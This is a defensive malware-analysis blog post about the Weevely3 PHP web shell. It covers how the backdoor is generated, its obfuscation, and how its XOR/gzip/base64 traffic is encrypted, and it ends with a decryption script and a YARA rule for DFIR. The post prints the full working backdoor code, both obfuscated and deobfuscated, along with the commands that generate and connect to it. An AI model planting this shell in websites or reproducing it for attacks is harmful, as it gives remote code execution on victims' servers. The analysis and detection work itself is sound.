---
layout: article
title: Weevely Backdoor Analysis
description: Weevely is a powerful polymorphic backdoor used in web post-explotation; this tool is written in Python and it generates a small obfuscated PHP shell which is then delievered to the targeted web server. The article will lay out it's communication chain and encryption scheme in order to assist blue team operators during a DFIR process.
category: research
modified: 2020-03-30
tags: [web, backdoor, php, analysis, yara]
image:
    path: "/assets/images/weevely.png"
---

<style>
.wrapper {
  max-width: 700px;
}
section {
  max-width: 700px;
  padding: 30px 0px 0px 0px;
}
pre, code {
    white-space: pre-wrap;
}
@media all and (max-width:480px) {
    img {float:center;display:block;margin:0 auto;}
}

@media all and (min-width:480px) {
    img {float:left;padding-right:30px;margin:0 auto;}
}
ul {
    list-style-image: none;
    list-style: none;
}
ul ul {
    margin:0;
}
p + ul {
    list-style: disc !important;
}
img {
    margin-bottom:8px;
    width: 100%;
}
pre, code {
    white-space: pre-wrap;
    word-wrap: break-word;
}
.highlighter-rouge {
    color: cyan;
}
</style>   

<i>**30 March, 2020** — [Go back to homepage](../)</i>
# Weevely Backdoor Analysis / Blue Team DFIR

<img align="center" src="/assets/images/weevely.png">

## Table of Contents
* [1. Executive Summary](#1-executive-summary)
* [2. Weevely Setup](#2-weevely-setup)
* [3. Network Inspection](#3-network-inspection)
* [4. Backtracking](#4-backtracking)
* [5. Automation](#5-automation)
* [6. YARA Rule](#6-yara-rule)

# 1. Executive Summary

Weevely is a versatile tool written in Python which serves as a web shell during the post-explotation phase. As an open-source project, it is available in <a href="https://github.com/epinna/weevely3" target="_blank">GitHub</a> – where weevely3 is the latest version being maintained – and can be installed through the APT Package Manager on Linux as well. It has powerful features by leveraging more than 30 modules to assist administrative tasks, maintain access, provide situational awareness, elevate privileges, and spread into the target network. 

Considering its small and polymorphic nature, it is hardly detected by AV vendors and blue team operators might find its encrypted communication chain difficult to revert. Therefore, this article will examine traffic network this script generates in order to facilitate DFIR.

# 2. Weevely Setup

You can [install](https://github.com/epinna/weevely3/wiki/Install) Weevely by either cloning the GitHub repository or installing the Debian-based package through APT. We are going to use the latest and maintained version which is Weevely3.

For demonstration purposes, I will generate "<i>artikrh.php</i>" with a password of "<i>artikrh</i>", which is then uploaded to the target web server and accessed through CLI:

{% highlight console %}
$ weevely generate artikrh artikrh.php
$ weevely http://a150b4a9.eu.ngrok.io/artikrh.php artikrh

weevely> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endhighlight %}

# 3. Network inspection

For this section, let's suppose we are performing digital forensics and incident response. We can use Wireshark to examine the network traffic by using the `http.request.uri contains "artikrh.php"` filter to identify relevant packets to the suspicious PHP file:

![Weevely Packets](/assets/images/weevely1.png)

Following the HTTP stream of these packets show gibberish POST data which may imply encryption and/or encoding:

![Weevely TCP Stream](/assets/images/weevely2.png)

{% highlight console %}
.XJ_Aaf.Yzk+W,so11a12a4a68f2Gqx5ev6t4ATRBAeG5NExNHoRMQo120bb3b9572cI.O5V$bDA2*7A!fm
{% endhighlight %}

If we take a close look at it from a high-level perspective, we may notice some random unidentified bytes at the beginning (`.XJ_Aaf.Yzk+W,so`) followed by what seems to be hexadecimal values (`11a12a4a68f2`) and Base64-encoded content (`Gqx5ev6t4ATRBAeG5NExNHoRMQo`). At the end of this data, we may notice additional hex numbers followed by again random data in a structure as seen below:

![Weevely Data Skeleton](/assets/images/weevely-data.svg)

At this point, the only part that we can make sense of is the Base64-encoded part, but which results in possible encrypted data when decoded:

{% highlight console %}
$ echo -n "Gqx5ev6t4ATRBAeG5NExNHoRMQo" | base64 -d

.¬yzþ.à.Ñ...äÑ14z.1
{% endhighlight %}

Considering that we already got a data skeleton in the bigger picture, we may turn back to the original script to further advance.

# 4. Backtracking

The content of the extracted "<i>artikrh.php</i>" file from the attacked web server is as follows: 

{% highlight php %}
<?php
$h='len(Q$t);$oQ="";QQQfor($i=0;$i<$l;)Q{for($QjQ=0;($j<$c&&$i<$lQ);$';
$P='Q("/$kQh(Q.+)$kf/"QQ,Q@file_gQet_contents("pQhp://inpuQt"),$m)Q==';
$M='1) {Q@ob_stQart(Q);@evQal(@gzuncoQmpressQQ(@x(@base6Q4_deQcode(Q$';
$B='$Qk="b02Q70e74";$kQQh="11a12a4a68f2"Q;Q$kf=QQ"120bb3b957QQ2c";$p=';
$f='"1DGp1QY6lWKI3pJ2P"Q;Qfunction x($tQ,$kQ){$QcQ=strlen($k);$l=sQtr';
$W='Qse64_encode(@x(Q@gzcomQpress(Q$o)Q,$k))Q;print("$pQ$kh$r$Qkf");}';
$y=str_replace('b','','crbebateb_bbfunbction');
$C='m[1])Q,$k)));$o=@Qob_QQget_conQtents();@ob_QeQnd_clean()Q;$Qr=@ba';
$r='j+Q+,$i++Q){$Qo.=$tQ{$i}^$Qk{$j};}}rQeturn $oQ;}ifQ (@pQreg_match';
$I=str_replace('Q','',$B.$f.$h.$r.$P.$M.$C.$W);
$X=$y('',$I);$X();
?>
{% endhighlight %}

Clearly, the PHP is obfuscated, however we can already see suspicious functions such as:
- `ob_stQart` => [ob_start()](https://www.php.net/manual/en/function.ob-start.php)
- `evQal` => [eval()](https://www.php.net/manual/en/function.eval.php)
- `gzuncoQmpress` => [gzuncompress()](https://www.php.net/manual/en/function.gzuncompress.php)
- `base6Q4_deQcode` => [base64_decode()](https://www.php.net/manual/en/function.base64-decode.php)

As a side note, you can google parts of this code in Google which may lead you eventually to Weevely3-related artifacts, so you know what the attacker has used. Do keep in mind that the script is polymorphic, therefore, the function order and variable names will always change randomly during generation. 

We can either deobfuscate it partially by manually executing the above PHP code in CLI without including the last `$X` variable:

{% highlight php %}
php > $h='len(Q$t);$oQ="";QQQfor($i=0;$i<$l;)Q{for($QjQ=0;($j<$c&&$i<$lQ);$';
php > $P='Q("/$kQh(Q.+)$kf/"QQ,Q@file_gQet_contents("pQhp://inpuQt"),$m)Q==';
php > $M='1) {Q@ob_stQart(Q);@evQal(@gzuncoQmpressQQ(@x(@base6Q4_deQcode(Q$';
php > $B='$Qk="b02Q70e74";$kQQh="11a12a4a68f2"Q;Q$kf=QQ"120bb3b957QQ2c";$p=';
php > $f='"1DGp1QY6lWKI3pJ2P"Q;Qfunction x($tQ,$kQ){$QcQ=strlen($k);$l=sQtr';
php > $W='Qse64_encode(@x(Q@gzcomQpress(Q$o)Q,$k))Q;print("$pQ$kh$r$Qkf");}';
php > $y=str_replace('b','','crbebateb_bbfunbction');
php > $C='m[1])Q,$k)));$o=@Qob_QQget_conQtents();@ob_QeQnd_clean()Q;$Qr=@ba';
php > $r='j+Q+,$i++Q){$Qo.=$tQ{$i}^$Qk{$j};}}rQeturn $oQ;}ifQ (@pQreg_match';
php > $I=str_replace('Q','',$B.$f.$h.$r.$P.$M.$C.$W);
php > print ($I);

$k="b0270e74";$kh="11a12a4a68f2";$kf="120bb3b9572c";$p="1DGp1Y6lWKI3pJ2P";function x($t,$k){$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i<$l;){for($j=0;($j<$c&&$i<$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}return $o;}if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {@ob_start();@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));$o=@ob_get_contents();@ob_end_clean();$r=@base64_encode(@x(@gzcompress($o),$k));print("$p$kh$r$kf");}
{% endhighlight %}

Or we can use the [UnPHP](https://www.unphp.net/) online which fully deobfuscates and formats the backdoor PHP code:

{% highlight php %}
<?php
$k = "b0270e74";
$kh = "11a12a4a68f2";
$kf = "120bb3b9572c";
$p = "1DGp1Y6lWKI3pJ2P";
function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0;$i < $l;) {
        for ($j = 0;($j < $c && $i < $l);$j++, $i++) {
            $o.= $t{$i} ^ $k{$j};
        }
    }
    return $o;
}
if (@preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m) == 1) {
    @ob_start();
    eval(@gzuncompress(@x(base64_decode($m[1]), $k)));
    $o = @ob_get_contents();
    @ob_end_clean();
    $r = @base64_encode(@x(@gzcompress($o), $k));
    print ("$p$kh$r$kf");
}
{% endhighlight %}

We notice some pre-defined variables, three which are in hex format (`$k`, `$kh`, and `$kf`) – a total number of 32 characters together, which might indicate MD5 hashing – and an unknown `$p` variable which seems to hold Base64-encoded data (decoding it outputs gibberish). Furthermore, there is a `x()` function which seems to XOR encrypt input data `$t` with input key `$k` (we already know `$k`). 

On the other hand, there is the last section which seems to do all the action of communicating back and forth. We start breaking this part down by analyzing the following line of code:

{% highlight php %}
if (@preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m) == 1)
{% endhighlight %}

This means that if HTTP request POST data contains `$kh` (the initial `11a12a4a68f2` hex data we identified earlier) and `$kf` (the enclosing `120bb3b9572c`) strings in it, store the match(es) in array `$m` (as described in PHP's [`file_get_contents()`](https://www.php.net/manual/en/function.file-get-contents.php) built-in function). In this case, the array will be comprised of two items:
1.	`$m[0]` => the whole match: `$kh` (12 chars) + Base64 data + `$kf` (12 chars)
2.	`$m[1]` => match in between static delimiters (`$kh`, `$kf`): Base64 data

It is worth noting that the regular expression excludes the unidentified random data at both ends of POST request string, so the initial diagram is transformed into:

![Weevely Data Skeleton 2](/assets/images/weevely-data2.svg)

The `eval()` bit is comprised in the following manner:
1.	Initially, `$m[1]` (data) is Base64 decoded
2.	Decoded data is XOR decrypted with key `$k` (in this case: `b0270e74`)
3.	Decrypted data is GNU zip (Gzip) decompressed to provide the arbitrary PHP code which is then executed by `eval()`

Output buffer (OB) functions are used to retrieve executed commands' result:
- `ob_start()`: Turns on output buffering
- `ob_get_contents()`: Standard out from the execution of arbitrary PHP code from `eval()`
- `ob_end_clean()`: Cleans the output buffer and turns off output buffering

Since we now have a clear idea on what the script does, we can decrypt traffic by backtracking. In summary, we can retrieve the first packet data in plaintext by storing it into a variable (in this case `$phpinput`) and printing the raw PHP code instead of sending it to `eval()`:

{% highlight php %}
<?php
$k = "b0270e74"; // FIRST PART: 8 first chars
$kh = "11a12a4a68f2"; // SECOND PART: 12 next chars
$kf = "120bb3b9572c"; // THIRD PART: 12 last chars
$p = "1DGp1Y6lWKI3pJ2P"; // Random data (?)

function x($t, $k) { // XOR
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l;) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
              $o.=$t{$i}^$k{$j};
            }
    }
    return $o;
}

$phpinput = ".XJ_Aaf.Yzk+W,so11a12a4a68f2Gqx5ev6t4ATRBAeG5NExNHoRMQo120bb3b9572cI.O5V\$bDA2*7A!fm"; // HTTP POST data

if (@preg_match("/$kh(.+)$kf/", $phpinput, $m) == 1) { // if $kh and $kf exist in php://input, store matches in array $m; if debugged with print_r($m) you will notice that $m[0] is $kh + b64data + $kf and $m[1] is b64data only

    $phpcode = @gzuncompress(@x(@base64_decode($m[1]), $k)); // gunzip(XOR(b64decode(data), key))
    print($phpcode);

/*
    @ob_start(); // Turn on output buffering
    @eval($phpcode); // Executes PHP code
    $o = @ob_get_contents(); // Save stdout to $o
    @ob_end_clean(); // Clean (erase) the output buffer and turn off output buffering

    $r = @base64_encode(@x(@gzcompress($o), $k)); // b64encode(XOR(gzip(stdout)), key)

    print("$p$kh$r$kf"); // HTTP Response data
*/
}
?>
{% endhighlight %}

Always take care of special characters such as the dollar sign in this input. Executing the above PHP code outputs:
{% highlight console %}
echo(69549);
{% endhighlight %}

This might seem confusing at first but it makes sense, the tool makes a [web-based check](https://github.com/epinna/weevely3/blob/master/modules/shell/php.py#L38) to ensure a proper connection end-point. If you decrypt the second packet, you get another validation check:

{% highlight console %}
@error_reporting(0);@system('echo 17236');
{% endhighlight %}

But this time, it ensures that is has necessary privileges to execute system commands on the victim server. Moreover, there are three more default packets which retrieve:
- Hostname
- Username
- Current working directory

In short, the five above requests are always sent immediately after initiating a backdoor communication channel. Decrypting the sixth request actually gives us the commander that the attacker wrote:

{% highlight console %}
chdir('/var/www/html');@error_reporting(0);@system('id 2>&1');
{% endhighlight %}

Functions such as `chdir()`, `error_reporting()`, and `system()` are always used; meanwhile the `2>&1` idiom is automatically appended after each user-entered command. 

# 5. Automation

I refined a script to decrypt content given as an input parameter to the script in CLI:

{% highlight php %}
<?php
$k = "b0270e74";
$kh = "11a12a4a68f2";
$kf = "120bb3b9572c";

echo decrypt($argv[1],$k,$kh,$kf);

function decrypt($data,$k,$kh,$kf){
    $data = peel($data,$kh,$kf);
	
    $first = base64_decode($data);
    $second = x($first,$k);
    $third = gzuncompress($second);
    return $third;
}

function peel($data,$kh,$kf){
    if (@preg_match("/$kh(.+)$kf/", $data, $m) == 1) {
        return $m[1];
    } else {
		exit("[*] Input does not match for decryption!");
	}
}

function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l;) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
              $o.=$t{$i}^$k{$j};
            }
    }
    return $o;
}
?>
{% endhighlight %}

Usage:

{% highlight console %}
$ php decrypt.php ".XJ_Aaf.Yzk+W,so11a12a4a68f2Gqx5+XisG+Yy5x18HLcYG03n/R/5qGbj1kZ6GhqvGL5Neh//H0/++CnnAje6cGAi9ZTUXZjyUNBF1lQdKLyeLWClMDcgpSFr120bb3b9572cI.O5V\$bDA2*7A\!fm"

chdir('/var/www/html');@error_reporting(0);@system('whoami 2>&1');
{% endhighlight %}

# 6. YARA Rule

While generating a new backdoor creates different assembling variable names and function orders, one detail that I have noticed is that the core deobfuscated core code remains the same. Its artifacts such as MD5 hash components (`$k`, `$kh`, and `$kf`) never change names or formats, only values; all of their static presence, including a `str_replace()` function as per its Python logic, denote that the script is a Weevely backdoor:

{% highlight c %}
rule weevely3_backdoor 
{
	meta:
		author = "Arti Karahoda"
		description = "Weevely3 - Weaponized Web Shell"
		reference = "https://artikrh.github.io/posts/weevely-backdoor-analysis"
		confidence = "high"
		last_updated = "30/03/2020"
	strings:
		$php = "<?php" ascii
		$rf1 = "$k" ascii
		$rf2 = "$kh" ascii
		$rf3 = "$kf" ascii
		$rf4 = "$p" ascii
		$rf5 = "$o" ascii
		$rf6 = /\$\w{1,4}=str_replace\('\w{1,}','','/ ascii
	condition:
		$php at 0 and all of ($rf*) and filesize > 500 and filesize < 1000
}
{% endhighlight %}

<i>[Go back to homepage](../)</i>